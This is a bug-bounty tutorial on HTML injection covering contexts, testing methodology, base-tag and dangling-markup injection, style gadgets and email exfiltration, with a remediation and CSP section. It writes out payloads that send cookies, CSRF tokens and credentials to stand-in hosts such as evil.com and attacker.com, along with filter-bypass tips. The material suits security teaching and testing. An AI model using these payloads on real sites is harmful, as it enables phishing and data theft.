---
title: "HTML Injection — ALL THINGS"
tag: WEB
labels: HTMLI, PHISHING
date: "2026-09-22"
tags:
  - web
  - html-injection
  - phishing
---
# HTML Injection — Complete Beginner Bug Hunter Guide

## 1. What Is HTML Injection?

HTML Injection happens when an application takes attacker-controlled input and places it into an HTML page **without properly encoding or sanitizing it**.

The browser then interprets the injected input as **HTML** instead of treating it as normal text.

For example, imagine a website contains:

```html
<h1>Welcome, USERNAME</h1>
```

The application expects:

```text
Welcome, Ahmed
```

But an attacker supplies:

```html
<u style="color:#2f7d4f">Injected</u>
```

The server might generate:

```html
<h1>Welcome, <u style="color:#2f7d4f">Injected</u></h1>
```

The browser renders:

<h1><center>Welcome, <u style="color:#2f7d4f">Injected</u></center></h1>

!!! note "The important point is:"
    <center>**The attacker did not simply change text. He changed the structure of the HTML document.**</center>


## 2. HTML Basics You Need Before Testing

You do **not** need to become an HTML expert before hunting HTML Injection.

You should understand:

```html
<tag>content</tag>
```

Examples:

```html
<p>Hello</p>
<h1>Hello</h1>
<b>Hello</b>
<i>Hello</i>
<div>Hello</div>
<a href="/profile">Profile</a>
<img src="/image.png">
```

HTML elements can also contain attributes:

```html
<a href="/profile" class="button">Profile</a>
```

Here:

```text
a        = tag
href     = attribute
/profile = attribute value
class    = attribute
button   = class value
```


## 3. How HTML Injection Happens

The basic vulnerability looks like this:

```mermaid
flowchart LR
    A[Attacker] --> B[Injects Payload]
    B --> C[Application]
    C --> D[HTML Response]
    D --> E[Browser]
    E --> F[Injected HTML]
```

For example:

```text
GET /search?q=hello
```

Application:

```html
<h2>Search results for: hello</h2>
```

Now test:

```text
GET /search?q=<b>TEST</b>
```

If the response becomes:

```html
<h2>Search results for: <b>TEST</b></h2>
```

the application is interpreting attacker-controlled input as **HTML**.

If instead the response becomes:

```html
<h2>Search results for: &lt;b&gt;TEST&lt;/b&gt;</h2>
```

the application is interpreting attacker-controlled input as **TEXT**.



## 4. HTML Injection vs XSS

HTML Injection and XSS are closely related, but they are not automatically the same finding.

### Core Difference
* **HTML Injection:** The attacker inserts basic **HTML code** (like `<h1>`, `<a>`, or `<form>`). It changes how the page looks or tricks users, but it cannot run dynamic scripts.
* **XSS (Cross-Site Scripting):** The attacker inserts **JavaScript code**. It runs inside the victim's browser and can steal sessions, cookies, or control the user account.

!!! note "Rule of Thumb"
    <center>**All XSS involves injecting HTML, but not all HTML injection is XSS.**</center>
    <center>**HTML Injection ➡️➡️ Possible XSS escalation**</center>

### Quick Comparison
<div align="center">
  <table>
    <thead>
      <tr>
        <th>Feature</th>
        <th>HTML Injection</th>
        <th>XSS (Cross-Site Scripting)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Injected Code</strong></td>
        <td>HTML tags (<code>&lt;h1&gt;</code>, <code>&lt;form&gt;</code>)</td>
        <td>JavaScript (<code>&lt;script&gt;</code>, <code>onerror=</code>)</td>
      </tr>
      <tr>
        <td><strong>Main Goal</strong></td>
        <td>Deface page, phishing links</td>
        <td>Steal cookies, hijack sessions</td>
      </tr>
      <tr>
        <td><strong>Cookie Access</strong></td>
        <td>❌ No</td>
        <td>✅ Yes</td>
      </tr>
    </tbody>
  </table>
</div>

### Code Examples

#### HTML Injection Example

```html
<h1>System Error! Click <a href="http://evil.com">here</a> to login.</h1>

```

* **Result:** The browser displays a fake link. Users are tricked into clicking it (Phishing), but no code runs automatically.

#### XSS Example

```html
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>

```

* **Result:** The browser **executes the script instantly** when the page loads and sends the victim's cookies to the attacker.


## 5. Types of HTML Injection

### 5.1 Reflected HTML Injection

The payload is sent within the HTTP request and immediately reflected back in the application's response without proper sanitization or encoding.

**Example Scenario:**

* **Request:** `/search?q=<b>TEST</b>`
* **Response:** `<h1>Results for <b>TEST</b></h1>`

Because the payload is not saved on the server, an attacker must **trick a victim into clicking a crafted link containing the malicious input**.


### 5.2 Stored HTML Injection

The application stores attacker-controlled input directly in a database or server file system, rendering it to users whenever the affected resource is rendered.

**Example Scenario:**

- **Stored Input:** `Username: <b>HACKED</b>`
- **Rendered Output:** `Welcome <b>HACKED</b>`

**Common Vulnerable Locations:**

- User profiles, display names, and avatars
- Comments, forum posts, and chat messages
- Support tickets and internal notifications
- Document titles, project names, and custom fields

Because stored payloads execute automatically when a page is loaded, they carry a significantly broader impact scope than reflected issues.

### 5.3 DOM-Based HTML Injection

The server is not directly involved in processing or reflecting the malicious payload. Instead, client-side JavaScript reads untrusted data from a sink source (like `location.hash`) and writes it directly into the Document Object Model (DOM) insecurely.

**Example Code:**

```javascript
const value = location.hash.substring(1);
document.getElementById("output").innerHTML = value;

```

The source is:

```text
location.hash
```

The sink is:

```text
innerHTML
```

Think in terms of:

```text
SOURCE → TRANSFORMATION → SINK
```

Common sources:

```javascript
location.search
location.hash
location.pathname
document.referrer
postMessage
localStorage
sessionStorage
```

Common HTML sinks:

```javascript
innerHTML
outerHTML
insertAdjacentHTML()
document.write()
document.writeln()
```


## 6. Understanding HTML Contexts

!!! tip "Important skill in HTML/XSS testing"
    **Before creating a payload, always ask:**

    <center>**Where exactly does my input appear in the HTML response?**</center>

### HTML body

```html
<div>YOUR_INPUT</div>
```

- try: `<b>HTMLTEST</b>`
- If the browser displays: **HTMLTEST** (you have confirmed HTMLI)

### Quoted Attribute

```html
<input value="YOUR_INPUT">
<input value='USER_INPUT'>
```

- try: `TEST"TEST`, `TEST'TEST`
- If the browser displays **Secure output**:
  ```html
  <input value="TEST&quot;TEST">
  ```
- If the browser displays **HTMLI**:
  ```html
  <input value="TEST"TEST">
  <input value='TEST'TEST'>
  ```

### Unquoted Attribute
```html
<input value=USER_INPUT>
```

- try: `><b>TEST</b>`
- If the browser displays **HTMLI**:
  ```html
  <input value=><b>TEST</b>
  ```

### Link

```html
<a href="USER_INPUT">Click</a>
```

or:

```html
<link href="USER_INPUT">
```

or:

```html
<img src="USER_INPUT">
```

**Testing URI schemes like javascript:alert(1) or data URIs (data:text/html,...)**

### HTML Comments
```html
<!-- USER_INPUT -->
```

Try:
```html
--><b>TEST</b><!--
```

If the comment context can be escaped, HTML injection may become possible.

### JavaScript

```html
<script>
let value = "YOUR_INPUT";
</script>
```

### CSS

```html
<style>
.example {
    background: YOUR_INPUT;
}
</style>
```

> Each context requires different analysis.

## 7. General Discovery Methodology

### Step 1 — Find Input

Look for:

```text
Search
Username
Display name
First name
Last name
Company
Project
Description
Comment
Bio
Ticket
Message
Document title
Tag
Category
API fields
```

Also test:

```text
Query parameters
POST parameters
JSON parameters
Path parameters
Multipart fields
GraphQL variables
WebSocket messages
URL fragments
```

### Step 2 — Insert a Unique Marker

Start with:

```text
HTMLTEST-12345
```

A unique marker makes reflection easy to locate.

Search for it in:

- HTTP response
- Page source
- DOM
- Browser UI

### Step 3 — Identify the Context

Find exactly where the marker appears.

Example:

```html
<div>HTMLTEST-12345</div>
```

Context:

```text
HTML body
```

### Step 4 — Test Harmless HTML

Start with:

```html
<b>HTMLTEST-12345</b>
<h1>HTMLTEST-12345</h1>
<i>HTMLTEST-12345</i>
<div>HTMLTEST-12345</div>
```

The goal is to determine whether the browser parses the input as markup.


### Step 5 — Determine Impact

Document the highest impact you can actually demonstrate:

```text
Visual modification
HTML structure manipulation
Stored cross-user rendering
Form manipulation
Potential XSS escalation
```

## 8. My Simple Methodology
### Step 1 — Test Every Input
Imagine a page has these input fields:

```text
firstname
lastname
description
```

I don't start with complicated payloads.

I simply put a basic HTML payload into every input:

```html
<h1>firstname</h1>
```

For the `firstname` field.

```html
<h1>lastname</h1>
```

For the `lastname` field.

```html
<h1>description</h1>
```

For the `description` field.


!!! tip "The idea is very simple:"
    <center>**Give every input a unique HTML payload so I can later identify exactly which input is being reflected.**</center>


### Step 2 — Intercept the Request

This is the most important part of my methodology.

After entering the payload, I intercept the request using Burp Suite.

For example, the browser might normally send:

```json
{
    "firstname": "&lt;h1&gt;firstname&lt;/h1&gt;"
}
```

If I see that the payload was already HTML-encoded **before the request was sent**, I know that the client-side code modified the value.

However, if the request body contains the original payload:

```json
{
    "firstname": "<h1>firstname</h1>"
}
```

then the client did not encode it before sending it.

At this point, **I can manually modify the intercepted request and put the raw payload directly into the request**.

For example:

```json
{
    "firstname": "<h1>firstname</h1>"
}
```

This allows me to **bypass client-side validation or encoding**.

### Step 3 — Don't Immediately Search for the Reflection
After injecting the payloads, I don't necessarily start searching the website for:

```text
<h1>firstname</h1>
```

```text
<h1>lastname</h1>
```

```text
<h1>description</h1>
```

Instead, I continue using the application normally.

I explore the different features of the application.

While testing these features, I watch what happens to the values I previously submitted.

Eventually, one of the payloads may be rendered somewhere:

```html
<h1>firstname</h1>
```

or:

```html
<h1>description</h1>
```

Because I used a different payload for every input, I immediately know which input is responsible.

For example:

```text
<h1>description</h1>
```

appears on the dashboard.

I immediately know:

```text
Input: description
Location: dashboard
Vulnerability: HTML Injection
```

### The Complete Workflow
My methodology can be summarized like this:
```mermaid
flowchart TD
    A[Find Input] --> B[Insert Unique HTML Payload]
    B --> C[Intercept Request with Burp]
    C --> D[Check Request Body]

    D --> E{Payload Encoded?}

    E -->|Yes| F[put the raw payload directly]
    E -->|No| G[Continue Testing]

    F --> H[Use the Application]
    G --> H

    H --> I[Test Different Features]
    I --> J[Payload Gets Reflected / Stored]
    J --> K[Identify Vulnerable Input]
    K --> L[Validate Impact Safely]
    L --> M[Report the Bug]
```


## 9. Base Tag Injection
> **Reference:** [Base tag HTML injection: A guide for pentesters](https://punksecurity.co.uk/blog/base_tag_injections/)
> This section summarizes and expands on the Base tag HTML injection described by **punksecurity**.


The `<base>` HTML element specifies the baseline URL used to resolve all relative paths (scripts, stylesheets, images) across a document.

```html
<base href="https://attacker.com/">
```

### Attack Mechanics
If an application allows injecting into the `<head>` section or prior to relative resource tags:

```html
<!-- Injected Payload -->
<base href="https://attacker-controlled.com/">

<!-- Existing Application Code -->
<script src="/assets/app.js"></script>
<img src="/images/logo.png">
```

The browser resolves relative paths against the attacker's base URL:
* Expected Script: `https://target.com/assets/app.js`
* Hijacked Script: `https://attacker-controlled.com/assets/app.js`

### Mitigation
Implement the CSP `base-uri` directive:
```http
Content-Security-Policy: base-uri 'self';
```

## 10. Dangling Markup Injection (Data Exfiltration Without JavaScript)
> **Reference:** *[Dangling Markup - HTML scriptless injection — HackTricks](https://hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html)* This section summarizes and expands on the basic techniques described by **HackTricks**


**Dangling Markup Injection** is an advanced HTML Injection technique used to exfiltrate sensitive data (CSRF tokens, session secrets, personal data) from the DOM **without requiring JavaScript execution**.

This approach is **particularly lethal** when strict **Content Security Policies (CSP)** block inline scripts (`unsafe-inline`) or `<script>` elements.

### 1) Core Mechanics & Concept

Dangling Markup relies on injecting an **unclosed HTML tag** containing an open quotation mark:

```html
<img src='https://attacker.com/log?data=
```

When the browser parses this payload, it treats the open quote (`'`) as the start of the `src` attribute value. Because no closing quote exists within the injected block, **the browser consumes all subsequent HTML content as string data until it encounters the first matching quote (`'`) in the page source**.

#### Exfiltration Scenario
Consider a vulnerable page rendering a **hidden CSRF token inside a form** where attributes use double quotes (`"`), followed by a link using single quotes (`'`):

```html
<div>
    <img src='https://attacker.com/log?data=
</div>

<form action="/transfer" method="POST">
    <input type="hidden"
           name="csrf_token"
           value="SECRET_TOKEN_998877">

    <button type="submit">
        Confirm
    </button>
</form>

<a href='https://target.example/profile'>
    Profile
</a>
```

#### Browser Interpretation
Because the injected `src` attribute opens with a **single quote** (`'`), the browser ignores all double quotes (`"`) inside the `<form>` and `<input>` tags. It merges the entire DOM segment into the `src` attribute string until it encounters the first matching single quote (`'`) in `<a href='...`:

```html
<img src='https://attacker.com/log?data=</div><form action="/transfer" method="POST"><input type="hidden" name="csrf_token" value="SECRET_TOKEN_998877"><button type="submit">Confirm</button></form><a href='
```

#### HTTP Request Sent to Attacker
The browser automatically fires an outbound GET request to the attacker's server, leaking the sensitive CSRF token within the request query string:

```http
GET /log?data=%3Cdiv%3E%3Cform%20action=%22/transfer%22%20method=%22POST%22%3E%3Cinput%20type=%22hidden%22%20name=%22csrf_token%22%20value=%22SECRET_TOKEN_998877%22%3E%3Cbutton%20type=%22submit%22%3EConfirm%3C/button%3E%3C/form%3E%3Ca%20href= HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0...
```

**Result:** The secret `SECRET_TOKEN_998877` is exfiltrated to `attacker.com` without executing any JavaScript.

### 2) Primary Injection Vectors

#### Image & Media Elements (Zero-Click)
Image tags automatically trigger outbound requests upon DOM parsing without requiring user interaction:
```html
<img src='https://attacker.com/log?body=
<img src='//attacker.com/log?data=
```

#### Meta & Form Redirects
Meta tags and form action hijacking can capture input fields or force redirections:
```html
<!-- Meta refresh redirection with dangling query -->
<meta http-equiv="refresh" content='0; url=https://attacker.com/log?data=

<!-- Form action hijacking -->
<form action='https://attacker.com/log'><input type="submit" value='
```

#### Link & Font Stylesheets
External stylesheet inclusions trigger data leakage during CSS parsing:
```html
<link rel="stylesheet" href='https://attacker.com/log?data=
```

---

### 3) Modern Browser Defenses & Mitigations

Modern browser engines (Chromium, Firefox, WebKit) have introduced structural defenses against multiline dangling markup attacks:

* **Newline Blockers in Resource URLs:**
   Browsers automatically reject or strip outbound requests for media resources (`<img>`, `<audio>`, `<video>`, `<link>`) if the URL string contains raw line breaks (`\n` or `\r`).

* **Bypass Constraints:**
    1. **Single-Line Context:** If the target secret and injected payload reside on the **same line** (no line breaks between the injection point and the secret), exfiltration still succeeds in modern browsers.
    2. **Form Action Redirection:** Using `<form action="...">` and forcing user submission can bypass resource URL newline restrictions.

* **Remediation & Defense-in-Depth:**
    1. **Strict Context-Aware Encoding:** Encode single quotes (`'` as `&#39;`) and double quotes (`"` as `&quot;`) to prevent escaping attribute contexts.
    2. **Content Security Policy (CSP):** Restrict destination origins using strict `img-src`, `default-src`, and `connect-src` directives (e.g., `Content-Security-Policy: default-src 'self'; img-src 'self';`).
    3. **SameSite Cookie Protections:** Enforce `SameSite=Strict` or `SameSite=Lax` on sensitive session cookies.

## 11. Advanced Payload with more impact

### 1. Auto Redirect (Zero Click)

```html
<!-- Instant redirect -->
<meta http-equiv="refresh" content="0;url=//evil.com">

<!-- Delayed redirect (bypass detection / looks legit) -->
<meta http-equiv="refresh" content="3;url=//evil.com">
```

- `http-equiv="refresh"` → tells the browser to refresh
- `content="0;url=..."`
    - `0` = delay in seconds
    - `url` = target destination
- Some filters block : `https://` & `http://` But they **don’t block `//`**

👉 As soon as the page loads → it redirects to `evil.com`

### 2. Full-page overlay to block UI

```html
<div style="position:fixed;inset:0;background:#fff;z-index:9999"></div>
<div style="position:absolute;inset:0;background:#fff;z-index:9999"></div>
<div style="position:fixed;inset:0;opacity:0;z-index:9999"></div> (Invisible overlay)
```

- `fixed` → covers the **entire screen always** ✅
- `absolute` → Positioned **relative to the nearest parent** with position
    - **If no parent** → relative to the page
- `inset:0` → fills the entire screen (**makes the element stretch to all edges**)
- `background:#fff` → hides the real page
- `z-index:9999` → stays on top of everything

**Final Tip**

- Always use: `position:fixed`
- Only use: `position:absolute` if `fixed` is blocked or filtered
- If `inset` is filtered: use `top:0;left:0;width:100%;height:100%`
- If `opacity:0` is filtered: use `background:transparent`

### 3. Blur the underlying page

```html
<style>body{filter:blur(8px)}</style>
```

### Impact Scenario (Similar to a Bug I Discovered)

The first three payloads can **significantly increase the impact of an HTML Injection vulnerability**

Consider the following scenario:

- An attacker has an HTML Injection vulnerability in their **display name**. The application is an organization-management platform where an administrator can remove members.

- When an administrator attempts to remove a member, the application displays a **confirmation dialog asking whether the administrator wants to proceed with the deletion**.

- Because the attacker's injected HTML is rendered inside this dialog, **the payload can affect the administrator's interface**.

#### 1. Automatic Redirect

The first payload can trigger a **redirect when the administrator opens the confirmation dialog**.

Instead of remaining on the legitimate application, the administrator can be redirected to an attacker-controlled page. This **could potentially be used to present a deceptive page requesting additional information**.

#### 2. Full-Screen Overlay

The second payload can place a **full-screen element over the application's interface**.

As a result, the administrator may no longer be able to interact with the underlying confirmation dialog, including the **Delete** button.


#### Practical Impact
In this scenario, the attacker-controlled member could become effectively **undeletable through the normal UI**, because opening the confirmation dialog causes **the administrator's interface to be redirected, covered**.

```mermaid
flowchart TD
    A["Attacker's Display Name"] --> B["HTML Injection"]
    B --> C["Administrator Opens Delete Confirmation"]
    C --> D["Injected HTML Executes"]

    D --> E["Redirect"]
    D --> F["Full-Screen Overlay"]

    E --> H["Administrator Cannot Normally Interact With the Dialog"]
    F --> H

    H --> I["Delete Action Becomes Inaccessible"]
```

### 4. Redirect with 1 CLICK

```html
<a href='//evil.com'><h1>SECURITY ALERT: SESSION EXPIRED<br>Click here to re-login and save your work<br>CLICK HERE TO CONTINUE</h1></a>
```

### 5. Full Attack (1 Click Anywhere)

```html
<a href="http://evil.com" style="position:fixed;inset:0;z-index:9999"></a>
<a href="http://evil.com" style="display:block;width:100vw;height:100vh;background:white"></a>
```

**Final Tip**

- If `position:fixed;inset:0` is filtered: use `display:block;width:100vw;height:100vh`
- `display:block;width:100vw;height:100vh` Works **in Markdown contexts** where payloads fail It exceeds the limits allowed in Markdown.

### 6. Using Internal Image URLs to Bypass SOP Restrictions

```html
<a href='//evil.com'>
  <h1>Click on Image</h1>
  <img src="INTERNAL_IMAGE_URL" width="1400">
</a>
```

- The image is loaded from the **same origin**
- Bypasses restrictions related to **external resources**

### 7. Simple Styled Phishing Form

```html
<form action=//evil.com>
<input placeholder=Password style="padding:6px;border:1px solid #ccc;border-radius:4px">
<button style="padding:6px;background:#07f;color:#fff;border:0;border-radius:4px">Login</button>
</form>

<!-- Simple FAKE LOGIN FORM -->
<form action="//evil.com">
  <input name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button>Login</button>
</form>
```

### 8. Hidden Request (Tracking / Blind HTMLI)

```html
<img src='//attacker.com/log' style='display:none'> <!-- use iplogger -->
<img src='//BURP-COLLABORATOR' style='display:none'>
```

- Automatically sends a request to attacker server when the page loads
- Use Cases
    - Confirm HTML Injection
    - Track users (IP, time, user-agent)
    - Test for SSRF / external interactions


## 12. Advanced HTML Injection Impact Escalation
> **Reference:** [How do I change HTMLi from Low to Critical? Is your mailbox safe? — lamscun](https://medium.com/@lamscun/how-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe)
> This section summarizes and expands on the techniques described by **lamscun**, with additional explanation for bug hunters and security researchers.

The original research demonstrates two particularly interesting escalation paths:

1. **Using existing CSS classes/IDs to create a full-page overlay without injecting CSS directly.**
2. **Abusing HTML Injection inside emails to interact with or expose content from the email itself.**


### What If `style` Is Filtered?

A common situation is that an application allows basic tags:

```html
<a>
<img>
<div>
<p>
<br>
```

but removes or sanitizes:

```html
<style>
```

and:

```html
style="..."
```

For example, this may be blocked:

```html
<img style="position:fixed;top:0;left:0;width:100%">
```

At first glance, this appears to **prevent the overlay technique**.

However, the application may still allow ordinary attributes such as:

```html
class="..."
```

or:

```html
id="..."
```

This leads to the next technique **Style Gadget Attack (SGA)**.

### Style Gadget Attack — Reusing Existing CSS

A **Style Gadget Attack (SGA)** takes advantage of CSS that already exists in the target application.

Instead of injecting new CSS, the **attacker searches the application's existing stylesheets for a class or ID** that already provides useful visual behavior.

For example, the application might contain:

```css
.modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 9999;
}
```

If the HTML Injection allows:

```html
<div class="modal-overlay"></div>
```

the browser applies the application's existing CSS to the attacker-controlled element.

The attacker therefore does not need to inject:

```html
<style>
```

or:

```html
style="..."
```

The application already contains the required CSS.

The attack can be visualized as:
```mermaid
flowchart LR
    A[Attacker controls HTML] --> B[Inject class=""]
    B --> C[Existing application CSS matches the class]
    C --> D[Browser applies the existing CSS]
    D --> E[Attacker-controlled element gains the CSS behavior]
```

### Finding Useful CSS Gadgets
Inspect the application's CSS files as well.

Search for classes containing properties such as:

```css
position: fixed;
```

```css
position: absolute;
```

```css
top: 0;
```

```css
left: 0;
```

```css
width: 100%;
```

```css
height: 100%;
```

```css
z-index: 9999;
```

Useful classes may belong to components such as:

```text
modal
overlay
backdrop
dialog
drawer
fullscreen
popup
toast
```

For example, an application might already contain:

```css
.overlay {
    position: fixed;
    inset: 0;
    z-index: 1000;
}
```

If your injection point accepts:

```html
<div class="overlay"></div>
```

the injected element may inherit the behavior of the legitimate application component.

### From Low to Higher Impact Through Email HTML Injection

The second major escalation technique described in the referenced article involves **HTML Injection inside emails**.

A basic Email HTML Injection may only allow an attacker to modify the content of an email sent from a legitimate domain. This is often treated as low impact because it resembles spam or simple content manipulation.

The more interesting scenario is when the attacker can obtain **content already present inside the victim's email**, such as:

* Activation links
* Password-reset links
* OTPs
* Tokens
* Other sensitive application-generated values

The technique described in the article relies on two HTML elements:

```html
<form>
<textarea>
```

If the email environment allows `<form>`, it can be used as the container for submitted data. The `<textarea>` is then used because HTML appearing after its opening tag can become part of its text value.

Conceptually:

```html
<form action="//attacker.example">
    <button type="submit">Continue</button>
    <textarea name="content">
        ...
```

The idea is that content already rendered after the injection point may become part of the textarea's value. **When the victim submits the form, that content is sent as form data**.

Therefore, the key escalation is:

```text
HTML Injection
      ↓
Inject <form> + <textarea>
      ↓
Existing email content becomes textarea data
      ↓
Victim submits the form
      ↓
Content is sent to a controlled endpoint
```

The main lesson is that Email HTML Injection should not be tested only for visual modification. Researchers should also examine whether the injected HTML can interact with **existing content in the email**, especially application-generated links and tokens.

## 13. Common Developer Mistakes

### Mistake 1 — String concatenation

Example:

```javascript
output.innerHTML = "<div>" + username + "</div>";
```

If `username` is untrusted, this can be dangerous.


### Mistake 2 — Trusting client-side validation

JavaScript may say:

```text
Invalid characters!
```

But the server might accept them directly.

!!! tip "Important Note: client-side validation is not enough"
    <center>**Always test the actual HTTP request using burp or `curl`.**</center>


### Mistake 3 — Blacklisting some tags like `<script>`

Blocking:

```text
<script>
```

does not solve HTML Injection or xss.

HTML contains hundreds of elements and attributes.

### Mistake 4 — Encoding only some characters

For example:

```text
< encoded
> encoded
" not encoded
```

An attribute context may still be vulnerable.

## 14. HTML Injection Remediation Guide
### 1. Context-Aware Output Encoding (Primary Defense)

The most critical defense against HTML Injection is converting user input into safe, non-executable plain text before rendering it in the browser. Standard HTML Entity Encoding transforms control characters (`<`, `>`, `"`, `'`, `&`) into their corresponding HTML entities.

#### Encoding Reference Table

| Character | Encoded Entity | Purpose |
| --- | --- | --- |
| `<` | `&lt;` | Prevents opening HTML tags |
| `>` | `&gt;` | Prevents closing HTML tags |
| `"` | `&quot;` | Prevents escaping attribute contexts |
| `'` | `&#x27;` | Prevents escaping attribute contexts |
| `&` | `&amp;` | Prevents entity injection |

### 2. Safe Rich-Text Handling (HTML Sanitization)

When the application requirement explicitly permits users to input formatted HTML (e.g., blog posts, rich-text editors, or support tickets), **Encoding cannot be used** because it breaks the intended formatting. Instead, use a strict, production-tested **HTML Sanitizer** based on an allow-list approach.

#### Recommended Libraries

* **Client-Side / DOM Sinks:** [DOMPurify](https://github.com/cure53/DOMPurify?utm_source=gemini)
* **Node.js:** `sanitize-html` or `DOMPurify` (via jsdom)
* **Python:** `bleach` or `nh3`
* **Java:** `OWASP Java HTML Sanitizer`

### 3. Secure DOM Manipulation Practices

Avoid using dangerous JavaScript methods (DOM Sinks) that parse strings as HTML. Replace them with safe properties that handle data strictly as text.

| Dangerous Sink | Safe Alternative | Action |
| --- | --- | --- |
| `element.innerHTML = input` | `element.textContent = input` | Assigns safe text directly |
| `document.write(input)` | `element.appendChild(textNode)` | Constructs safe DOM elements |
| `element.outerHTML = input` | `element.innerText = input` | Safe text rendering |


### 4. Content Security Policy (CSP) Integration
While a Content Security Policy (CSP) is primarily an anti-XSS header, it acts as a **crucial secondary layer of defense** against HTML Injection.

If an attacker successfully injects HTML elements (such as `<iframe>`, `<form>`, `<link>`, or `<img>`), a well-configured CSP prevents them from exfiltrating data, executing injected scripts, or loading malicious external assets.

#### Recommended Defensive CSP Rules

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; frame-src 'none'; object-src 'none'; form-action 'self'; frame-ancestors 'none';

```

#### Directives Explanation for HTML Injection Mitigation

**`form-action 'self'`**
   
   * **Mitigated Attack:** **Form Hijacking / Phishing**.
   * **Explanation:** Prevent attackers from injecting `<form action="https://evil.com/phish">` to steal credentials or CSRF tokens when a user submits an injected form.


**`frame-src 'none'` / `child-src 'none'`**
   
   * **Mitigated Attack:** **Iframe Injection / Defacement**.
   * **Explanation:** Disallows loading embedded `<iframe>` elements from external malicious domains or unauthorized endpoints.


**`object-src 'none'`**
   
   * **Mitigated Attack:** **Legacy Plugin Injection**.
   * **Explanation:** Prevents injection of `<object>`, `<embed>`, or `<applet>` elements that could load legacy malicious Flash or Java applets.


**`style-src 'self'`**
   
   * **Mitigated Attack:** **CSS Injection / Exfiltration**.
   * **Explanation:** Prevents attackers from injecting arbitrary `<style>` tags or `style=""` attributes to alter layout, deface pages, or exfiltrate data using CSS selectors with background images.


**`img-src 'self'`**
   
   * **Mitigated Attack:** **Pixel Tracking / Data Exfiltration via Images**.
   * **Explanation:** Restricts image sources to prevent attackers from injecting `<img src="https://evil.com/log?data=">` to leak sensitive text tokens or track users.


### Remediation Summary Checklist
* [ ] Apply HTML Entity Encoding to all user-controlled data rendered in HTML body and attribute contexts.
* [ ] Ensure quotes (`"` and `'`) are explicitly encoded inside HTML attributes.
* [ ] Use robust libraries like `DOMPurify` when HTML tags must be permitted.
* [ ] Replace dangerous DOM sinks (`innerHTML`) with safe text sinks (`textContent`).
* [ ] Implement a strict HTTP CSP header containing `form-action`, `frame-src`, and `object-src` restrictions.